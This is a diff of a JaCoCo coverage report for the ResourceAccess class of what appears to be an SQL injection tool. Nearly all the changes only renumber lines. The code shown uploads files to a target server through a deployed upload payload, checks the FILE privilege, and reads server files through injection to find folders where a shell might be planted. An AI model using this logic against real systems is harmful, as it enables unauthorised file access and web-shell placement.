+<span class="nc" id="L706">        String urlFileFixed = urlFile;</span>
+<span class="nc bnc" id="L707" title="All 2 branches missed.">        if (StringUtils.isEmpty(urlFileFixed)) {</span>
             
-<span class="nc" id="L865">            urlFileFixed = this.injectionModel.getMediatorUtils()</span>
-<span class="nc" id="L866">                .getConnectionUtil()</span>
-<span class="nc" id="L867">                .getUrlBase()</span>
-<span class="nc" id="L868">                .substring(</span>
+<span class="nc" id="L709">            urlFileFixed = this.injectionModel.getMediatorUtils()</span>
+<span class="nc" id="L710">                .getConnectionUtil()</span>
+<span class="nc" id="L711">                .getUrlBase()</span>
+<span class="nc" id="L712">                .substring(</span>
                     0,
-<span class="nc" id="L870">                    this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1</span>
+<span class="nc" id="L714">                    this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1</span>
                 );
         }
         
-<span class="nc bnc" id="L874" title="All 2 branches missed.">        if (bodyShellInjected.contains(bodyShell)) {</span>
+<span class="nc bnc" id="L718" title="All 2 branches missed.">        if (bodyShellInjected.contains(bodyShell)) {</span>
             
-<span class="nc" id="L876">            String logUrlFileFixed = urlFileFixed;</span>
-<span class="nc" id="L877">            String logPathShellFixed = pathShellFixed;</span>
-<span class="nc" id="L878">            LOGGER.log(</span>
+<span class="nc" id="L720">            String logUrlFileFixed = urlFileFixed;</span>
+<span class="nc" id="L721">            String logPathShellFixed = pathShellFixed;</span>
+<span class="nc" id="L722">            LOGGER.log(</span>
                 LogLevelUtil.CONSOLE_SUCCESS,
                 &quot;Upload payload deployed at '{}{}' in '{}{}'&quot;,
-<span class="nc" id="L881">                () -&gt; logUrlFileFixed,</span>
-<span class="nc" id="L882">                () -&gt; this.filenameUpload,</span>
-<span class="nc" id="L883">                () -&gt; logPathShellFixed,</span>
-<span class="nc" id="L884">                () -&gt; this.filenameUpload</span>
+<span class="nc" id="L725">                () -&gt; logUrlFileFixed,</span>
+<span class="nc" id="L726">                () -&gt; this.filenameUpload,</span>
+<span class="nc" id="L727">                () -&gt; logPathShellFixed,</span>
+<span class="nc" id="L728">                () -&gt; this.filenameUpload</span>
             );
             
-<span class="nc" id="L887">            try (InputStream streamToUpload = new FileInputStream(file)) {</span>
+<span class="nc" id="L731">            try (InputStream streamToUpload = new FileInputStream(file)) {</span>
 
-<span class="nc" id="L889">                HttpResponse&lt;String&gt; result = this.upload(file, urlFileFixed +&quot;/&quot;+ this.filenameUpload, streamToUpload);</span>
+<span class="nc" id="L733">                HttpResponse&lt;String&gt; result = this.upload(file, urlFileFixed +&quot;/&quot;+ this.filenameUpload, streamToUpload);</span>
                 
-<span class="nc" id="L891">                this.confirmUpload(file, pathShellFixed, urlFileFixed, result);</span>
+<span class="nc" id="L735">                this.confirmUpload(file, pathShellFixed, urlFileFixed, result);</span>
             }
             
-<span class="nc" id="L894">        } else {</span>
+<span class="nc" id="L738">        } else {</span>
             
-<span class="nc" id="L896">            throw this.getIntegrityError(sourcePage);</span>
+<span class="nc" id="L740">            throw this.getIntegrityError(sourcePage);</span>
         }
         
-<span class="nc" id="L899">        var request = new Request();</span>
-<span class="nc" id="L900">        request.setMessage(Interaction.END_UPLOAD);</span>
-<span class="nc" id="L901">        this.injectionModel.sendToViews(request);</span>
-<span class="nc" id="L902">    }</span>
+<span class="nc" id="L743">        var request = new Request();</span>
+<span class="nc" id="L744">        request.setMessage(Interaction.END_UPLOAD);</span>
+<span class="nc" id="L745">        this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L746">    }</span>
 
     private HttpResponse&lt;String&gt; upload(File file, String string, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
         
-<span class="nc" id="L906">        var crLf = &quot;\r\n&quot;;</span>
-<span class="nc" id="L907">        var boundary = &quot;---------------------------4664151417711&quot;;</span>
+<span class="nc" id="L750">        var crLf = &quot;\r\n&quot;;</span>
+<span class="nc" id="L751">        var boundary = &quot;---------------------------4664151417711&quot;;</span>
         
-<span class="nc" id="L909">        var streamData = new byte[streamToUpload.available()];</span>
+<span class="nc" id="L753">        var streamData = new byte[streamToUpload.available()];</span>
         
-<span class="nc bnc" id="L911" title="All 2 branches missed.">        if (streamToUpload.read(streamData) == -1) {</span>
+<span class="nc bnc" id="L755" title="All 2 branches missed.">        if (streamToUpload.read(streamData) == -1) {</span>
             
-<span class="nc" id="L913">            throw new JSqlException(&quot;Error reading the file&quot;);</span>
+<span class="nc" id="L757">            throw new JSqlException(&quot;Error reading the file&quot;);</span>
         }
         
-<span class="nc" id="L916">        String headerForm = StringUtils.EMPTY;</span>
-<span class="nc" id="L917">        headerForm += &quot;--&quot;+ boundary + crLf;</span>
-<span class="nc" id="L918">        headerForm += &quot;Content-Disposition: form-data; name=\&quot;u\&quot;; filename=\&quot;&quot;+ file.getName() +&quot;\&quot;&quot;+ crLf;</span>
-<span class="nc" id="L919">        headerForm += &quot;Content-Type: binary/octet-stream&quot;+ crLf;</span>
-<span class="nc" id="L920">        headerForm += crLf;</span>
+<span class="nc" id="L760">        String headerForm = StringUtils.EMPTY;</span>
+<span class="nc" id="L761">        headerForm += &quot;--&quot;+ boundary + crLf;</span>
+<span class="nc" id="L762">        headerForm += &quot;Content-Disposition: form-data; name=\&quot;u\&quot;; filename=\&quot;&quot;+ file.getName() +&quot;\&quot;&quot;+ crLf;</span>
+<span class="nc" id="L763">        headerForm += &quot;Content-Type: binary/octet-stream&quot;+ crLf;</span>
+<span class="nc" id="L764">        headerForm += crLf;</span>
 
-<span class="nc" id="L922">        String headerFile = StringUtils.EMPTY;</span>
-<span class="nc" id="L923">        headerFile += crLf +&quot;--&quot;+ boundary +&quot;--&quot;+ crLf;</span>
+<span class="nc" id="L766">        String headerFile = StringUtils.EMPTY;</span>
+<span class="nc" id="L767">        headerFile += crLf +&quot;--&quot;+ boundary +&quot;--&quot;+ crLf;</span>
 
-<span class="nc" id="L925">        var httpRequest = HttpRequest.newBuilder()</span>
-<span class="nc" id="L926">            .uri(URI.create(string))</span>
-<span class="nc" id="L927">            .timeout(Duration.ofSeconds(15))</span>
-<span class="nc" id="L928">            .POST(</span>
-<span class="nc" id="L929">                BodyPublishers.ofByteArrays(</span>
-<span class="nc" id="L930">                    Arrays.asList(</span>
-<span class="nc" id="L931">                        headerForm.getBytes(),</span>
-<span class="nc" id="L932">                        Files.readAllBytes(Paths.get(file.toURI())),</span>
-<span class="nc" id="L933">                        headerFile.getBytes()</span>
+<span class="nc" id="L769">        var httpRequest = HttpRequest.newBuilder()</span>
+<span class="nc" id="L770">            .uri(URI.create(string))</span>
+<span class="nc" id="L771">            .timeout(Duration.ofSeconds(15))</span>
+<span class="nc" id="L772">            .POST(</span>
+<span class="nc" id="L773">                BodyPublishers.ofByteArrays(</span>
+<span class="nc" id="L774">                    Arrays.asList(</span>
+<span class="nc" id="L775">                        headerForm.getBytes(),</span>
+<span class="nc" id="L776">                        Files.readAllBytes(Paths.get(file.toURI())),</span>
+<span class="nc" id="L777">                        headerFile.getBytes()</span>
                     )
                 )
             )
-<span class="nc" id="L937">            .setHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=&quot; + boundary)</span>
-<span class="nc" id="L938">            .build();</span>
+<span class="nc" id="L781">            .setHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=&quot; + boundary)</span>
+<span class="nc" id="L782">            .build();</span>
             
-<span class="nc" id="L940">        return this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().send(httpRequest, BodyHandlers.ofString());</span>
+<span class="nc" id="L784">        return this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().send(httpRequest, BodyHandlers.ofString());</span>
     }
 
     private void confirmUpload(File file, String pathShellFixed, String urlFileFixed, HttpResponse&lt;String&gt; httpResponse) {
    
-<span class="nc bnc" id="L945" title="All 2 branches missed.">        if (httpResponse.body().contains(DataAccess.LEAD + &quot;y&quot;)) {</span>
+<span class="nc bnc" id="L789" title="All 2 branches missed.">        if (httpResponse.body().contains(DataAccess.LEAD + &quot;y&quot;)) {</span>
             
-<span class="nc" id="L947">            LOGGER.log(</span>
+<span class="nc" id="L791">            LOGGER.log(</span>
                 LogLevelUtil.CONSOLE_SUCCESS,
                 &quot;File '{}' uploaded into '{}'&quot;,
-<span class="nc" id="L950">                file::getName,</span>
-<span class="nc" id="L951">                () -&gt; pathShellFixed</span>
+<span class="nc" id="L794">                file::getName,</span>
+<span class="nc" id="L795">                () -&gt; pathShellFixed</span>
             );
             
         } else {
             
-<span class="nc" id="L956">            LOGGER.log(</span>
+<span class="nc" id="L800">            LOGGER.log(</span>
                 LogLevelUtil.CONSOLE_ERROR,
                 &quot;Upload file '{}' into '{}' failed&quot;,
-<span class="nc" id="L959">                file::getName,</span>
-<span class="nc" id="L960">                () -&gt; pathShellFixed</span>
+<span class="nc" id="L803">                file::getName,</span>
+<span class="nc" id="L804">                () -&gt; pathShellFixed</span>
             );
         }
         
-<span class="nc" id="L964">        Map&lt;String, String&gt; headers = ConnectionUtil.getHeadersMap(httpResponse);</span>
+<span class="nc" id="L808">        Map&lt;String, String&gt; headers = ConnectionUtil.getHeadersMap(httpResponse);</span>
             
-<span class="nc" id="L966">        Map&lt;Header, Object&gt; msgHeader = new EnumMap&lt;&gt;(Header.class);</span>
-<span class="nc" id="L967">        msgHeader.put(Header.URL, urlFileFixed);</span>
-<span class="nc" id="L968">        msgHeader.put(Header.POST, StringUtils.EMPTY);</span>
-<span class="nc" id="L969">        msgHeader.put(Header.HEADER, StringUtils.EMPTY);</span>
-<span class="nc" id="L970">        msgHeader.put(Header.RESPONSE, headers);</span>
-<span class="nc" id="L971">        msgHeader.put(Header.SOURCE, httpResponse.toString());</span>
+<span class="nc" id="L810">        Map&lt;Header, Object&gt; msgHeader = new EnumMap&lt;&gt;(Header.class);</span>
+<span class="nc" id="L811">        msgHeader.put(Header.URL, urlFileFixed);</span>
+<span class="nc" id="L812">        msgHeader.put(Header.POST, StringUtils.EMPTY);</span>
+<span class="nc" id="L813">        msgHeader.put(Header.HEADER, StringUtils.EMPTY);</span>
+<span class="nc" id="L814">        msgHeader.put(Header.RESPONSE, headers);</span>
+<span class="nc" id="L815">        msgHeader.put(Header.SOURCE, httpResponse.toString());</span>
    
-<span class="nc" id="L973">        var request = new Request();</span>
-<span class="nc" id="L974">        request.setMessage(Interaction.MESSAGE_HEADER);</span>
-<span class="nc" id="L975">        request.setParameters(msgHeader);</span>
-<span class="nc" id="L976">        this.injectionModel.sendToViews(request);</span>
-<span class="nc" id="L977">    }</span>
+<span class="nc" id="L817">        var request = new Request();</span>
+<span class="nc" id="L818">        request.setMessage(Interaction.MESSAGE_HEADER);</span>
+<span class="nc" id="L819">        request.setParameters(msgHeader);</span>
+<span class="nc" id="L820">        this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L821">    }</span>
     
     /**
      * Check if current user can read files.
@@ -985,52 +829,52 @@ public class ResourceAccess {
         
         // Unsupported Reading file when &lt;file&gt; is not present in current xmlModel
         // Fix #41055: NullPointerException on getFile()
-<span class="pc bpc" id="L988" title="1 of 2 branches missed.">        if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {</span>
+<span class="pc bpc" id="L832" title="1 of 2 branches missed.">        if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {</span>
             
-<span class="nc" id="L990">            LOGGER.log(</span>
+<span class="nc" id="L834">            LOGGER.log(</span>
                 LogLevelUtil.CONSOLE_ERROR,
                 &quot;Reading file on {} is currently not supported&quot;,
-<span class="nc" id="L993">                () -&gt; this.injectionModel.getMediatorVendor().getVendor()</span>
+<span class="nc" id="L837">                () -&gt; this.injectionModel.getMediatorVendor().getVendor()</span>
             );
-<span class="nc" id="L995">            return false;</span>
+<span class="nc" id="L839">            return false;</span>
         }
         
-<span class="fc" id="L998">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
+<span class="fc" id="L842">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
 
-<span class="fc" id="L1000">        String resultInjection = new SuspendableGetRows(this.injectionModel).run(</span>
-<span class="fc" id="L1001">            this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),</span>
+<span class="fc" id="L844">        String resultInjection = new SuspendableGetRows(this.injectionModel).run(</span>
+<span class="fc" id="L845">            this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),</span>
             sourcePage,
-<span class="fc" id="L1003">            false,</span>
-<span class="fc" id="L1004">            1,</span>
+<span class="fc" id="L847">            false,</span>
+<span class="fc" id="L848">            1,</span>
             null,
             &quot;privilege&quot;
         );
 
-<span class="pc bpc" id="L1009" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(resultInjection)) {</span>
+<span class="pc bpc" id="L853" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(resultInjection)) {</span>
             
-<span class="nc" id="L1011">            this.injectionModel.sendResponseFromSite(&quot;Can't read privilege&quot;, sourcePage[0].trim());</span>
-<span class="nc" id="L1012">            var request = new Request();</span>
-<span class="nc" id="L1013">            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);</span>
-<span class="nc" id="L1014">            this.injectionModel.sendToViews(request);</span>
-<span class="nc" id="L1015">            this.readingIsAllowed = false;</span>
+<span class="nc" id="L855">            this.injectionModel.sendResponseFromSite(&quot;Can't read privilege&quot;, sourcePage[0].trim());</span>
+<span class="nc" id="L856">            var request = new Request();</span>
+<span class="nc" id="L857">            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);</span>
+<span class="nc" id="L858">            this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L859">            this.readingIsAllowed = false;</span>
             
-<span class="pc bpc" id="L1017" title="1 of 2 branches missed.">        } else if (&quot;false&quot;.equals(resultInjection)) {</span>
+<span class="pc bpc" id="L861" title="1 of 2 branches missed.">        } else if (&quot;false&quot;.equals(resultInjection)) {</span>
             
-<span class="nc" id="L1019">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Privilege FILE not granted to current user: files not readable&quot;);</span>
-<span class="nc" id="L1020">            var request = new Request();</span>
-<span class="nc" id="L1021">            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);</span>
-<span class="nc" id="L1022">            this.injectionModel.sendToViews(request);</span>
-<span class="nc" id="L1023">            this.readingIsAllowed = false;</span>
+<span class="nc" id="L863">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Privilege FILE not granted to current user: files not readable&quot;);</span>
+<span class="nc" id="L864">            var request = new Request();</span>
+<span class="nc" id="L865">            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);</span>
+<span class="nc" id="L866">            this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L867">            this.readingIsAllowed = false;</span>
             
-<span class="nc" id="L1025">        } else {</span>
+<span class="nc" id="L869">        } else {</span>
             
-<span class="fc" id="L1027">            var request = new Request();</span>
-<span class="fc" id="L1028">            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);</span>
-<span class="fc" id="L1029">            this.injectionModel.sendToViews(request);</span>
-<span class="fc" id="L1030">            this.readingIsAllowed = true;</span>
+<span class="fc" id="L871">            var request = new Request();</span>
+<span class="fc" id="L872">            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);</span>
+<span class="fc" id="L873">            this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L874">            this.readingIsAllowed = true;</span>
         }
         
-<span class="fc" id="L1033">        return this.readingIsAllowed;</span>
+<span class="fc" id="L877">        return this.readingIsAllowed;</span>
     }
 
     /**
@@ -1044,103 +888,103 @@ public class ResourceAccess {
      */
     public List&lt;String&gt; readFile(List&lt;String&gt; pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
 
-<span class="fc" id="L1047">        if (</span>
-<span class="fc bfc" id="L1048" title="All 2 branches covered.">            this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMySQL()</span>
-<span class="pc bpc" id="L1049" title="1 of 2 branches missed.">            &amp;&amp; !this.isReadingAllowed()</span>
+<span class="fc" id="L891">        if (</span>
+<span class="fc bfc" id="L892" title="All 2 branches covered.">            this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMySQL()</span>
+<span class="pc bpc" id="L893" title="1 of 2 branches missed.">            &amp;&amp; !this.isReadingAllowed()</span>
         ) {
 
-<span class="nc" id="L1052">            return Collections.emptyList();</span>
+<span class="nc" id="L896">            return Collections.emptyList();</span>
         }
 
-<span class="fc" id="L1055">        var countFileFound = 0;</span>
-<span class="fc" id="L1056">        var results = new ArrayList&lt;String&gt;();</span>
+<span class="fc" id="L899">        var countFileFound = 0;</span>
+<span class="fc" id="L900">        var results = new ArrayList&lt;String&gt;();</span>
 
-<span class="fc" id="L1058">        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable(&quot;CallableReadFile&quot;));</span>
-<span class="fc" id="L1059">        CompletionService&lt;CallableFile&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
+<span class="fc" id="L902">        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable(&quot;CallableReadFile&quot;));</span>
+<span class="fc" id="L903">        CompletionService&lt;CallableFile&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
 
-<span class="fc bfc" id="L1061" title="All 2 branches covered.">        for (String pathFile: pathsFiles) {</span>
+<span class="fc bfc" id="L905" title="All 2 branches covered.">        for (String pathFile: pathsFiles) {</span>
 
-<span class="fc" id="L1063">            var callableFile = new CallableFile(pathFile, this.injectionModel);</span>
-<span class="fc" id="L1064">            taskCompletionService.submit(callableFile);</span>
+<span class="fc" id="L907">            var callableFile = new CallableFile(pathFile, this.injectionModel);</span>
+<span class="fc" id="L908">            taskCompletionService.submit(callableFile);</span>
 
-<span class="fc" id="L1066">            this.getCallablesReadFile().add(callableFile);</span>
-<span class="fc" id="L1067">        }</span>
+<span class="fc" id="L910">            this.getCallablesReadFile().add(callableFile);</span>
+<span class="fc" id="L911">        }</span>
 
-<span class="fc" id="L1069">        List&lt;String&gt; duplicate = new ArrayList&lt;&gt;();</span>
-<span class="fc" id="L1070">        int submittedTasks = pathsFiles.size();</span>
+<span class="fc" id="L913">        List&lt;String&gt; duplicate = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L914">        int submittedTasks = pathsFiles.size();</span>
         int tasksHandled;
 
         for (
-<span class="fc" id="L1074">            tasksHandled = 0</span>
-<span class="pc bpc" id="L1075" title="1 of 4 branches missed.">            ; tasksHandled &lt; submittedTasks &amp;&amp; !this.isSearchFileStopped()</span>
-<span class="fc" id="L1076">            ; tasksHandled++</span>
+<span class="fc" id="L918">            tasksHandled = 0</span>
+<span class="pc bpc" id="L919" title="1 of 4 branches missed.">            ; tasksHandled &lt; submittedTasks &amp;&amp; !this.isSearchFileStopped()</span>
+<span class="fc" id="L920">            ; tasksHandled++</span>
         ) {
 
-<span class="fc" id="L1079">            var currentCallable = taskCompletionService.take().get();</span>
+<span class="fc" id="L923">            var currentCallable = taskCompletionService.take().get();</span>
 
-<span class="pc bpc" id="L1081" title="1 of 2 branches missed.">            if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {</span>
+<span class="pc bpc" id="L925" title="1 of 2 branches missed.">            if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {</span>
 
-<span class="fc" id="L1083">                var name = currentCallable.getPathFile()</span>
-<span class="fc" id="L1084">                    .substring(currentCallable.getPathFile().lastIndexOf('/') + 1);</span>
-<span class="fc" id="L1085">                String content = currentCallable.getSourceFile();</span>
-<span class="fc" id="L1086">                String path = currentCallable.getPathFile();</span>
+<span class="fc" id="L927">                var name = currentCallable.getPathFile()</span>
+<span class="fc" id="L928">                    .substring(currentCallable.getPathFile().lastIndexOf('/') + 1);</span>
+<span class="fc" id="L929">                String content = currentCallable.getSourceFile();</span>
+<span class="fc" id="L930">                String path = currentCallable.getPathFile();</span>
 
-<span class="fc" id="L1088">                var request = new Request();</span>
-<span class="fc" id="L1089">                request.setMessage(Interaction.CREATE_FILE_TAB);</span>
-<span class="fc" id="L1090">                request.setParameters(name, content, path);</span>
-<span class="fc" id="L1091">                this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L932">                var request = new Request();</span>
+<span class="fc" id="L933">                request.setMessage(Interaction.CREATE_FILE_TAB);</span>
+<span class="fc" id="L934">                request.setParameters(name, content, path);</span>
+<span class="fc" id="L935">                this.injectionModel.sendToViews(request);</span>
 
-<span class="pc bpc" id="L1093" title="1 of 2 branches missed.">                if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {</span>
+<span class="pc bpc" id="L937" title="1 of 2 branches missed.">                if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {</span>
 
-<span class="fc" id="L1095">                    LOGGER.log(</span>
+<span class="fc" id="L939">                    LOGGER.log(</span>
                         LogLevelUtil.CONSOLE_INFORM,
                         &quot;Shell might be possible in folder {}&quot;,
-<span class="fc" id="L1098">                        () -&gt; path.replace(name, StringUtils.EMPTY)</span>
+<span class="fc" id="L942">                        () -&gt; path.replace(name, StringUtils.EMPTY)</span>
                     );
                 }
 
-<span class="fc" id="L1102">                duplicate.add(path.replace(name, StringUtils.EMPTY));</span>
-<span class="fc" id="L1103">                results.add(content);</span>
+<span class="fc" id="L946">                duplicate.add(path.replace(name, StringUtils.EMPTY));</span>
+<span class="fc" id="L947">                results.add(content);</span>
 
-<span class="fc" id="L1105">                countFileFound++;</span>
+<span class="fc" id="L949">                countFileFound++;</span>
             }
         }
 
         // Force ongoing suspendables to stop immediately
-<span class="fc bfc" id="L1110" title="All 2 branches covered.">        for (CallableFile callableReadFile: this.getCallablesReadFile()) {</span>
+<span class="fc bfc" id="L954" title="All 2 branches covered.">        for (CallableFile callableReadFile: this.getCallablesReadFile()) {</span>
 
-<span class="fc" id="L1112">            callableReadFile.getSuspendableReadFile().stop();</span>
-<span class="fc" id="L1113">        }</span>
+<span class="fc" id="L956">            callableReadFile.getSuspendableReadFile().stop();</span>
+<span class="fc" id="L957">        }</span>
 
-<span class="fc" id="L1115">        this.getCallablesReadFile().clear();</span>
+<span class="fc" id="L959">        this.getCallablesReadFile().clear();</span>
 
-<span class="fc" id="L1117">        taskExecutor.shutdown();</span>
-<span class="fc" id="L1118">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
+<span class="fc" id="L961">        taskExecutor.shutdown();</span>
+<span class="fc" id="L962">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
 
-<span class="fc" id="L1120">        this.setSearchFileStopped(false);</span>
+<span class="fc" id="L964">        this.setSearchFileStopped(false);</span>
 
-<span class="fc" id="L1122">        var result = String.format(</span>
+<span class="fc" id="L966">        var result = String.format(</span>
             &quot;Found %s file%s%s on %s files checked&quot;,
-<span class="fc" id="L1124">            countFileFound,</span>
-<span class="pc bpc" id="L1125" title="1 of 2 branches missed.">            countFileFound &gt; 1 ? 's' : StringUtils.EMPTY,</span>
-<span class="pc bpc" id="L1126" title="1 of 2 branches missed.">            tasksHandled != submittedTasks ? &quot; of &quot;+ tasksHandled +&quot; processed &quot; : StringUtils.EMPTY,</span>
-<span class="fc" id="L1127">            submittedTasks</span>
+<span class="fc" id="L968">            countFileFound,</span>
+<span class="pc bpc" id="L969" title="1 of 2 branches missed.">            countFileFound &gt; 1 ? 's' : StringUtils.EMPTY,</span>
+<span class="pc bpc" id="L970" title="1 of 2 branches missed.">            tasksHandled != submittedTasks ? &quot; of &quot;+ tasksHandled +&quot; processed &quot; : StringUtils.EMPTY,</span>
+<span class="fc" id="L971">            submittedTasks</span>
         );
 
-<span class="pc bpc" id="L1130" title="1 of 2 branches missed.">        if (countFileFound &gt; 0) {</span>
+<span class="pc bpc" id="L974" title="1 of 2 branches missed.">        if (countFileFound &gt; 0) {</span>
 
-<span class="fc" id="L1132">            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);</span>
+<span class="fc" id="L976">            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);</span>
 
         } else {
 
-<span class="nc" id="L1136">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);</span>
+<span class="nc" id="L980">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);</span>
         }
 
-<span class="fc" id="L1139">        var request = new Request();</span>
-<span class="fc" id="L1140">        request.setMessage(Interaction.END_FILE_SEARCH);</span>
-<span class="fc" id="L1141">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L983">        var request = new Request();</span>
+<span class="fc" id="L984">        request.setMessage(Interaction.END_FILE_SEARCH);</span>
+<span class="fc" id="L985">        this.injectionModel.sendToViews(request);</span>
 
-<span class="fc" id="L1143">        return results;</span>
+<span class="fc" id="L987">        return results;</span>
     }
     
     /**
@@ -1150,61 +994,61 @@ public class ResourceAccess {
      */
     public void stopSearchingFile() {
         
-<span class="nc" id="L1153">        this.setSearchFileStopped(true);</span>
+<span class="nc" id="L997">        this.setSearchFileStopped(true);</span>
         
         // Force ongoing suspendable to stop immediately
-<span class="nc bnc" id="L1156" title="All 2 branches missed.">        for (CallableFile callable: this.getCallablesReadFile()) {</span>
+<span class="nc bnc" id="L1000" title="All 2 branches missed.">        for (CallableFile callable: this.getCallablesReadFile()) {</span>
             
-<span class="nc" id="L1158">            callable.getSuspendableReadFile().stop();</span>
-<span class="nc" id="L1159">        }</span>
-<span class="nc" id="L1160">    }</span>
+<span class="nc" id="L1002">            callable.getSuspendableReadFile().stop();</span>
+<span class="nc" id="L1003">        }</span>
+<span class="nc" id="L1004">    }</span>
     
     private JSqlException getIntegrityError(String[] sourcePage) {
         
-<span class="nc" id="L1164">        return new JSqlException(&quot;Payload integrity check failure: &quot;+ sourcePage[0].trim().replace(&quot;\\n&quot;, &quot;\\\\\\n&quot;));</span>
+<span class="nc" id="L1008">        return new JSqlException(&quot;Payload integrity check failure: &quot;+ sourcePage[0].trim().replace(&quot;\\n&quot;, &quot;\\\\\\n&quot;));</span>
     }
     
     
     // Getters and setters
     
     public boolean isSearchAdminStopped() {
-<span class="fc" id="L1171">        return this.isSearchAdminStopped;</span>
+<span class="fc" id="L1015">        return this.isSearchAdminStopped;</span>
     }
 
     public void setSearchAdminStopped(boolean isSearchAdminStopped) {
-<span class="fc" id="L1175">        this.isSearchAdminStopped = isSearchAdminStopped;</span>
-<span class="fc" id="L1176">    }</span>
+<span class="fc" id="L1019">        this.isSearchAdminStopped = isSearchAdminStopped;</span>
+<span class="fc" id="L1020">    }</span>
     
     public void setScanStopped(boolean isScanStopped) {
-<span class="nc" id="L1179">        this.isScanStopped = isScanStopped;</span>
-<span class="nc" id="L1180">    }</span>
+<span class="nc" id="L1023">        this.isScanStopped = isScanStopped;</span>
+<span class="nc" id="L1024">    }</span>
 
     public boolean isReadingIsAllowed() {
-<span class="nc" id="L1183">        return this.readingIsAllowed;</span>
+<span class="nc" id="L1027">        return this.readingIsAllowed;</span>
     }
 
     public void setReadingIsAllowed(boolean readingIsAllowed) {
-<span class="fc" id="L1187">        this.readingIsAllowed = readingIsAllowed;</span>
-<span class="fc" id="L1188">    }</span>
+<span class="fc" id="L1031">        this.readingIsAllowed = readingIsAllowed;</span>
+<span class="fc" id="L1032">    }</span>
 
     public boolean isScanStopped() {
-<span class="nc" id="L1191">        return this.isScanStopped;</span>
+<span class="nc" id="L1035">        return this.isScanStopped;</span>
     }
 
     public boolean isSearchFileStopped() {
-<span class="fc" id="L1195">        return this.isSearchFileStopped;</span>
+<span class="fc" id="L1039">        return this.isSearchFileStopped;</span>
     }
 
     public void setSearchFileStopped(boolean isSearchFileStopped) {
-<span class="fc" id="L1199">        this.isSearchFileStopped = isSearchFileStopped;</span>
-<span class="fc" id="L1200">    }</span>
+<span class="fc" id="L1043">        this.isSearchFileStopped = isSearchFileStopped;</span>
+<span class="fc" id="L1044">    }</span>
 
     public List&lt;CallableFile&gt; getCallablesReadFile() {
-<span class="fc" id="L1203">        return this.callablesReadFile;</span>
+<span class="fc" id="L1047">        return this.callablesReadFile;</span>
     }
 
     public void setCallablesReadFile(List&lt;CallableFile&gt; callablesReadFile) {
-<span class="nc" id="L1207">        this.callablesReadFile = callablesReadFile;</span>
-<span class="nc" id="L1208">    }</span>
+<span class="nc" id="L1051">        this.callablesReadFile = callablesReadFile;</span>
+<span class="nc" id="L1052">    }</span>
 }
 </pre><div class="footer"><span class="right">Created with <a href="http://www.jacoco.org/jacoco">JaCoCo</a> 0.8.11.202310140853</span></div></body></html>
